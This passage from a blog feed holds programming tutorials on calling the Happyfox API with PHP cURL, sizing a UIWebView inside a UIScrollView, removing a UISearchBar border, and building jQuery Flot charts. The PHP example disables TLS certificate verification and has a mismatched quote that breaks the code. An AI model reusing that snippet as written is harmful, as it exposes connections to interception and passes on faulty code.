CURLOPT_USERPWD, <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%s:%s&#x27;</span>, &lt;Happyfox api key&gt;, &lt;Happyfox auth code&gt;)); <span class="comment">// here is the HTTP basic auth</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPAUTH, CURLAUTH_ANY);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// don&#x27;t forget to set your form data</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="variable">$status</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$status</span>[<span class="string">&#x27;http_code] == 200) &#123;</span></span><br><span class="line"><span class="string">    $result = json_decode($response, true);</span></span><br><span class="line"><span class="string">    print_r($result);</span></span><br><span class="line"><span class="string">&#125; else &#123;</span></span><br><span class="line"><span class="string">    echo &#x27;</span><span class="built_in">Error</span> occurred<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><p><em>References:</em></p><ul><li><em><a href="https://stackoverflow.com/questions/15200632/how-to-upload-file-using-curl-with-php/15200804#15200804">how to upload file using curl with php</a></em></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.happyfox.com/&quot;&gt;Happyfox&lt;/a&gt; is a ticketing service provider. Recently I’m dealing with it’s API and took me quite</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="happyfox" scheme="http://jslim.net/tags/happyfox/"/>
    
  </entry>
  
  <entry>
    <title>Use UIWebView with UIScrollView</title>
    <link href="http://jslim.net/blog/2014/07/18/use-uiwebview-with-uiscrollview/"/>
    <id>http://jslim.net/blog/2014/07/18/use-uiwebview-with-uiscrollview/</id>
    <published>2014-07-18T05:27:08.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>When we want to display a bunch of description, <code>UIWebView</code> is the choice.</p><p>Usually we do it in this way</p><p><strong>ViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_webView = [[<span class="built_in">UIWebView</span> alloc] initWithFrame:<span class="built_in">CGRectMake</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">320</span>, <span class="number">300</span>)];</span><br><span class="line">[<span class="keyword">self</span>.view addSubview:_webView];</span><br></pre></td></tr></table></figure><p>What it will look like</p><p><img src="/images/posts/2014-07-18-use-uiwebview-with-uiscrollview/webview-1.png" alt="Normal webview"></p><p><strong>NOTE: the “A button” is just for you to see the difference of different changes of <code>webview</code></strong></p><p>But what if we want it to transparent? Let’s try to set the background to <code>clearColor</code></p><p><strong>ViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_webView.backgroundColor = [<span class="built_in">UIColor</span> clearColor];</span><br></pre></td></tr></table></figure><p><img src="/images/posts/2014-07-18-use-uiwebview-with-uiscrollview/webview-2.png" alt="webview with background transparent"></p><p>Ooopsss…. Only its background is transparent. Want to make the whole view transparent? Let’s do in this way</p><p><strong>ViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">_webView.opaque = <span class="literal">NO</span>;</span><br><span class="line">_webView.backgroundColor = [<span class="built_in">UIColor</span> clearColor];</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">UIView</span>* subView <span class="keyword">in</span> [_webView subviews])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ([subView isKindOfClass:[<span class="built_in">UIScrollView</span> <span class="keyword">class</span>]]) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">UIView</span>* shadowView <span class="keyword">in</span> [subView subviews])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ([shadowView isKindOfClass:[<span class="built_in">UIImageView</span> <span class="keyword">class</span>]]) &#123;</span><br><span class="line">                [shadowView setHidden:<span class="literal">YES</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>and see the result</p><p><img src="/images/posts/2014-07-18-use-uiwebview-with-uiscrollview/webview-3.png" alt="transparent webview"></p><p>Hmm… it looks better. Now let’s make it smooth, make the whole thing scroll together <em>(html content and the “A button”)</em></p><p>Now, the problem is we need to know how much space <em>(the height of the webView)</em> needed for the html content. One of the way is we can get it thru JavaScript</p><p>First, add <code>delegate</code> to the <code>webView</code></p><p><strong>ViewController.h</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">@interface</span> <span class="title">ViewController</span> : <span class="title">UIViewController</span> &lt;<span class="title">UIWebViewDelegate</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_webView.delegate = <span class="keyword">self</span>;</span><br></pre></td></tr></table></figure><p>Then implement <code>webViewDidFinishLoad:</code></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> mark - UIWebViewDelegate</span></span><br><span class="line">- (<span class="type">void</span>)webViewDidFinishLoad:(<span class="built_in">UIWebView</span> *)webView</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// get the html content height</span></span><br><span class="line">    <span class="built_in">NSString</span> *output = [webView stringByEvaluatingJavaScriptFromString:<span class="string">@&quot;document.getElementById(\&quot;main-wrapper\&quot;).offsetHeight;&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// adjust the height of webView</span></span><br><span class="line">    <span class="built_in">CGRect</span> frame = webView.frame;</span><br><span class="line">    frame.size.height = [output intValue];</span><br><span class="line">    webView.frame = frame;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Before that, add a <code>&lt;div&gt;</code> <em>(with a unique ID, in this case I use “main-wrapper”)</em> to wrap the html content, e.g.</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[_webView loadHTMLString:[<span class="built_in">NSString</span> stringWithFormat:<span class="string">@&quot;&lt;div id=\&quot;main-wrapper\&quot;&gt;%@&lt;/div&gt;div&gt;&quot;</span>, html] baseURL:<span class="literal">nil</span>];</span><br></pre></td></tr></table></figure><p>let’s run it and see</p><p><img src="/images/posts/2014-07-18-use-uiwebview-with-uiscrollview/webview-4.png" alt="full height webview"></p><p>Now it looks better, but we cannot see the content if too long, and also overlap with the button. To solve this, let’s add a <code>UIScrollView</code> in between the <code>webView</code> and <code>self.view</code></p><p><strong>ViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_scrollView = [[<span class="built_in">UIScrollView</span> alloc] initWithFrame:<span class="keyword">self</span>.view.bounds];</span><br><span class="line">_scrollView.autoresizingMask = <span class="built_in">UIViewAutoresizingFlexibleBottomMargin</span> | <span class="built_in">UIViewAutoresizingFlexibleHeight</span> | <span class="built_in">UIViewAutoresizingFlexibleTopMargin</span>;</span><br><span class="line">[<span class="keyword">self</span>.view addSubview:_scrollView];</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[_scrollView addSubview:_webView];</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">[_scrollView addSubview:_aButton]; <span class="comment">// the button below</span></span><br></pre></td></tr></table></figure><p>Add these lines to bottom of <code>webViewDidFinishLoad:</code></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// adjust the position of the button</span></span><br><span class="line">frame = _button.frame;</span><br><span class="line">frame.origin.y = <span class="built_in">CGRectGetMaxY</span>(webView.frame) + <span class="number">15</span>;</span><br><span class="line">_button.frame = frame;</span><br><span class="line"></span><br><span class="line"><span class="comment">// adjust the content size of scrollView</span></span><br><span class="line">_scrollView.contentSize = <span class="built_in">CGSizeMake</span>(_scrollView.contentSize.width, <span class="built_in">CGRectGetMaxY</span>(_button.frame) + <span class="number">15</span>);</span><br></pre></td></tr></table></figure><p><em>(<strong>15</strong> is margin)</em></p><p><img src="/images/posts/2014-07-18-use-uiwebview-with-uiscrollview/webview-5.png" alt="scrollable webview"></p><p>See the scroll bar on the right side?</p><p>We’re done here. Now we have a smooth scrollable content view</p><p><strong>Ahhhhh!!!! One more thing here</strong></p><p>The initial height of <code>UIWebView</code> must not be <code>0</code>, e.g.</p><p><strong>ViewController.m</strong></p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_webView = [[<span class="built_in">UIWebView</span> alloc] initWithFrame:<span class="built_in">CGRectMake</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">320</span>, <span class="number">0</span>)]; <span class="comment">// &lt;--- if height is 0</span></span><br></pre></td></tr></table></figure><p>The result will be</p><p><img src="/images/posts/2014-07-18-use-uiwebview-with-uiscrollview/webview-6.png" alt="wrong height webview"></p><p>This is due to <code>document.getElementById(&#39;main-wrapper&#39;).offsetHeight;</code> return a wrong value, and I don’t know why <em>(if you know please comment)</em>, this took me 1 hours++ to figure out, at lease you must put <code>1</code> for the height.</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;When we want to display a bunch of description, &lt;code&gt;UIWebView&lt;/code&gt; is the choice.&lt;/p&gt;
&lt;p&gt;Usually we do it in this</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>Remove the 1px Shadow From UISearchBar</title>
    <link href="http://jslim.net/blog/2014/07/13/remove-the-1px-shadow-from-uisearchbar/"/>
    <id>http://jslim.net/blog/2014/07/13/remove-the-1px-shadow-from-uisearchbar/</id>
    <published>2014-07-13T19:56:04.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>When I added a <code>UISearchBar</code> to <code>UITableView.tableHeaderView</code>, it shows a border</p><p><img src="/images/posts/2014-07-14-remove-the-1px-shadow-from-uisearchbar/with-shadow.png" alt="With shadow"></p><p><img src="/images/posts/2014-07-14-remove-the-1px-shadow-from-uisearchbar/with-shadow-zoom.png" alt="With shadow zoom"></p><p>So in order to remove the <strong>1px</strong>, just</p><figure class="highlight obj-c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">self</span>.searchBar.layer.borderColor = [<span class="built_in">UIColor</span> yourColor].CGColor;</span><br><span class="line"><span class="keyword">self</span>.searchBar.layer.borderWidth = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>The final result will be</p><p><img src="/images/posts/2014-07-14-remove-the-1px-shadow-from-uisearchbar/without-shadow.png" alt="Without shadow"></p><p><img src="/images/posts/2014-07-14-remove-the-1px-shadow-from-uisearchbar/without-shadow-zoom.png" alt="Without shadow zoom"></p><p><em>References:</em></p><ul><li><a href="https://stackoverflow.com/questions/6868214/remove-the-1px-border-under-uisearchbar/6868227#6868227">Remove the 1px border under UISearchBar</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;When I added a &lt;code&gt;UISearchBar&lt;/code&gt; to &lt;code&gt;UITableView.tableHeaderView&lt;/code&gt;, it shows a border&lt;/p&gt;
&lt;p&gt;&lt;img</summary>
        
      
    
    
    
    
    <category term="ios" scheme="http://jslim.net/tags/ios/"/>
    
  </entry>
  
  <entry>
    <title>jQuery Flot - Create a stackable bar graph and line graph combination</title>
    <link href="http://jslim.net/blog/2014/07/07/jquery-flot-create-a-stackable-bar-graph-and-line-graph-combination/"/>
    <id>http://jslim.net/blog/2014/07/07/jquery-flot-create-a-stackable-bar-graph-and-line-graph-combination/</id>
    <published>2014-07-07T05:34:47.000Z</published>
    <updated>2022-05-09T09:30:48.613Z</updated>
    
    <content type="html"><![CDATA[<p>Plot a stack bar graph with line graph combination.</p><div id="flot-1ine" style="height:210px">    <div id="flot-1ine-loading">Loading...</div></div><p>Look at the graph above, is that cool?</p><h2 id="1-Include-all-necessary-JavaScript-files"><a href="#1-Include-all-necessary-JavaScript-files" class="headerlink" title="1. Include all necessary JavaScript files."></a>1. Include all necessary JavaScript files.</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://cdnjs.cloudflare.com/ajax/libs/flot/0.8.2/jquery.flot.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://cdn.jsdelivr.net/jquery.flot.tooltip/0.7.1/jquery.flot.tooltip.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://cdnjs.cloudflare.com/ajax/libs/flot/0.8.2/jquery.flot.resize.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;jquery.flot.grow.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> <span class="comment">&lt;!-- you can get from http://jumflot.jumware.com/examples/Experimental/grow.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://cdnjs.cloudflare.com/ajax/libs/flot/0.8.2/jquery.flot.stack.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://cdnjs.cloudflare.com/ajax/libs/jquery-dateFormat/1.0/jquery.dateFormat.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Notice that I’m using CDN for those library, of course you may host it yourself.</p><h2 id="2-Add-a-placeholder-for-the-graph"><a href="#2-Add-a-placeholder-for-the-graph" class="headerlink" title="2. Add a placeholder for the graph"></a>2. Add a placeholder for the graph</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;flot-graph&quot;</span> <span class="attr">style</span>=<span class="string">&quot;height:210px&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Simple? Because all the data are populated from javascript.</p><h2 id="3-Settings-for-the-graph"><a href="#3-Settings-for-the-graph" class="headerlink" title="3. Settings for the graph"></a>3. Settings for the graph</h2><p>The <strong>Settings</strong> here is refer to color, label, effect, etc. Let’s do it one by one</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> flot_options = &#123;</span><br><span class="line">    <span class="attr">series</span>: &#123;</span><br><span class="line">        <span class="attr">grow</span>: &#123; <span class="comment">// grow animation</span></span><br><span class="line">            <span class="attr">active</span>: <span class="literal">true</span>, <span class="comment">// activate the plugin</span></span><br><span class="line">            <span class="attr">steps</span>: <span class="number">50</span> <span class="comment">// number of seperate steps will be shown from beginning to the end</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">stack</span>: <span class="literal">true</span>, <span class="comment">// is stackable?</span></span><br><span class="line">        <span class="attr">shadowSize</span>: <span class="number">2</span> <span class="comment">// is the default size of shadows in pixels. Set it to 0 to remove shadows</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">grid</span>: &#123;</span><br><span class="line">        <span class="attr">hoverable</span>: <span class="literal">true</span>, <span class="comment">// once hover, it will highlight</span></span><br><span class="line">        <span class="attr">clickable</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">tickColor</span>: <span class="string">&#x27;#f0f0f0&#x27;</span>, <span class="comment">// the color in the background (i.e. cell border color)</span></span><br><span class="line">        <span class="attr">borderWidth</span>: <span class="number">0</span>, <span class="comment">// the border for the graph container</span></span><br><span class="line">        <span class="attr">color</span>: <span class="string">&#x27;#333333&#x27;</span> <span class="comment">// the color of the label (on the right-hand-side)</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">xaxis</span>:&#123;</span><br><span class="line">        <span class="attr">tickDecimals</span>: <span class="number">0</span>, <span class="comment">// the number of decimals to display</span></span><br><span class="line">        <span class="attr">tickSize</span>: <span class="number">1</span>, <span class="comment">// the size of interval between 2 ticks</span></span><br><span class="line">        <span class="attr">tickFormatter</span>: <span class="keyword">function</span>(<span class="params">val, axis</span>) &#123;</span><br><span class="line">            <span class="comment">// you can format the label text to display</span></span><br><span class="line">            <span class="keyword">return</span> val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">yaxis</span>: &#123; <span class="comment">// same as x-axis</span></span><br><span class="line">        <span class="attr">ticks</span>: <span class="number">5</span>,</span><br><span class="line">        <span class="attr">min</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">tickDecimals</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">tickFormatter</span>: <span class="keyword">function</span>(<span class="params">val, axis</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">tooltip</span>: <span class="literal">true</span>, <span class="comment">// whether to show tooltip</span></span><br><span class="line">    <span class="attr">tooltipOpts</span>: &#123;</span><br><span class="line">        <span class="attr">content</span>: <span class="keyword">function</span>(<span class="params">label, x, y</span>) &#123;</span><br><span class="line">            <span class="comment">// format the content of tooltip</span></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">parseInt</span>(y) + <span class="string">&#x27; &#x27;</span> + label;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">defaultTheme</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">shifts</span>: &#123; <span class="comment">// the position from the cursor</span></span><br><span class="line">            <span class="attr">x</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">y</span>: <span class="number">20</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Now we already done the general settings for the graph. Let’s configure bar graph and line graph differently</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> line_options = &#123;</span><br><span class="line">    <span class="attr">show</span>: <span class="literal">true</span>, <span class="comment">// whether to show the line between ticks</span></span><br><span class="line">    <span class="attr">lineWidth</span>: <span class="number">2</span>, <span class="comment">// the thickness of the line</span></span><br><span class="line">    <span class="attr">fill</span>: <span class="literal">true</span>, <span class="comment">// whether the shape should be filled, in this case will be the color below the line</span></span><br><span class="line">    <span class="attr">fillColor</span>: &#123; <span class="comment">// the color for the fill</span></span><br><span class="line">        <span class="attr">colors</span>: [&#123; <span class="comment">// this is to set the gradient</span></span><br><span class="line">            <span class="attr">opacity</span>: <span class="number">0.0</span></span><br><span class="line">        &#125;, &#123;</span><br><span class="line">            <span class="attr">opacity</span>: <span class="number">0.7</span></span><br><span class="line">        &#125;]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bar_options = &#123;</span><br><span class="line">    <span class="attr">show</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">align</span>: <span class="string">&#x27;center&#x27;</span>, <span class="comment">// alignment for the bar</span></span><br><span class="line">    <span class="attr">lineWidth</span>: <span class="number">0</span>, <span class="comment">// the border width of the bar</span></span><br><span class="line">    <span class="attr">fill</span>: <span class="literal">true</span>, <span class="comment">// fill with color?</span></span><br><span class="line">    <span class="attr">barWidth</span>: <span class="number">0.6</span> <span class="comment">// the width of the bars in units of the axis</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="4-Populate-data"><a href="#4-Populate-data" class="headerlink" title="4. Populate data"></a>4. Populate data</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">    <span class="attr">dataType</span>: <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&#x27;/path/to/graph/data.php&#x27;</span>,</span><br><span class="line">    <span class="attr">success</span>: populateGraph</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">populateGraph</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> graph_data = [];</span><br><span class="line"></span><br><span class="line">    graph_data.<span class="title function_">push</span>(&#123;</span><br><span class="line">        <span class="attr">label</span>: <span class="string">&#x27;iOS&#x27;</span>, <span class="comment">// the the label (show in the right side)</span></span><br><span class="line">        <span class="attr">bars</span>: bar_options, <span class="comment">// set the bar config defined just now</span></span><br><span class="line">        <span class="attr">color</span>: <span class="string">&#x27;#d063e6&#x27;</span>, <span class="comment">// set a different color for different bar</span></span><br><span class="line">        <span class="attr">data</span>: data.<span class="property">ios</span> <span class="comment">// populate data to this bar</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// same as above</span></span><br><span class="line">    graph_data.<span class="title function_">push</span>(&#123;<span class="attr">label</span>: <span class="string">&#x27;Android&#x27;</span>, <span class="attr">bars</span>: bar_options, <span class="attr">color</span>: <span class="string">&#x27;#a4c739&#x27;</span>, <span class="attr">data</span>: data.<span class="property">android</span>&#125;);</span><br><span class="line"></span><br><span class="line">    graph_data.<span class="title function_">push</span>(&#123;</span><br><span class="line">        <span class="attr">label</span>: <span class="string">&#x27;User&#x27;</span>,</span><br><span class="line">        <span class="attr">lines</span>: line_options, <span class="comment">// set the line graph config</span></span><br><span class="line">        <span class="attr">stack</span>: <span class="literal">false</span>, <span class="comment">// this is line graph, and not stackable, thus set to false</span></span><br><span class="line">        <span class="attr">color</span>: <span class="string">&#x27;#00aeef&#x27;</span>,</span><br><span class="line">        <span class="attr">points</span>: &#123;<span class="attr">radius</span>: <span class="number">5</span>, <span class="attr">show</span>: <span class="literal">true</span>&#125;, <span class="comment">// the `circle` size for the line graph</span></span><br><span class="line">        <span class="attr">data</span>: data.<span class="property">user</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set the overall data to the main graph with general settings</span></span><br><span class="line">    $(<span class="string">&#x27;#flot-graph&#x27;</span>).<span class="property">length</span> &amp;&amp; $.<span class="title function_">plot</span>($(<span class="string">&#x27;#flot-graph&#x27;</span>), graph_data, flot_options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Note that the format for the data should be in this form <code>[x, y]</code> <em>(i.e. <code>data.user</code> above)</em></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">[</span><span class="number">0</span><span class="punctuation">,</span> <span class="number">28</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">[</span><span class="number">1</span><span class="punctuation">,</span> <span class="number">17</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">[</span><span class="number">2</span><span class="punctuation">,</span> <span class="number">21</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">[</span><span class="number">3</span><span class="punctuation">,</span> <span class="number">30</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">[</span><span class="number">4</span><span class="punctuation">,</span> <span class="number">22</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">[</span><span class="number">5</span><span class="punctuation">,</span> <span class="number">9</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">[</span><span class="number">6</span><span class="punctuation">,</span> <span class="number">18</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">[</span><span class="number">7</span><span class="punctuation">,</span> <span class="number">27</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p>You’re done!!!</p><script src="http://cdnjs.cloudflare.com/ajax/libs/flot/0.8.2/jquery.flot.min.js"></script><script src="http://cdn.jsdelivr.net/jquery.flot.tooltip/0.7.1/jquery.flot.tooltip.min.js"></script><script src="http://cdnjs.cloudflare.com/ajax/libs/flot/0.8.2/jquery.flot.resize.min.js"></script><script src="/assets/posts/2014-07-07-jquery-flot-create-a-stackable-bar-graph-and-line-graph-combination/jquery.flot.grow.js"></script><script 